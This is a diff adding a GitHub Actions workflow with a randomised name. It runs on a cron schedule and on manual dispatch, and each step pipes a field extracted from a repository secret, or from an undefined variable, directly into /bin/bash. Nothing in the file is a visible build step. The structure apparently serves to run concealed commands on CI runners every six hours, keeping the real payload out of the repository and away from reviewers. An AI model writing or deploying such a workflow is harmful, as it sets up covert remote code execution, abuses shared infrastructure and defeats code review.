@@ -1,0 +1,23 @@
+name: liruicheng9876
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '2 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liruicheng9876
+        env:
+          admv940: ${{ secrets.admv940 }}
+        run: |
+          echo $admv940 | jq -r .w6753 | /bin/bash
+          echo $jhzt9043 | jq -r .rm6539 | /bin/bash
+          echo $bft5 | jq -r .cbx3188 | /bin/bash
+          echo $asrk9 | jq -r .k1772 | /bin/bash
+          echo $mzg58716 | jq -r .swsd9976 | /bin/bash
+
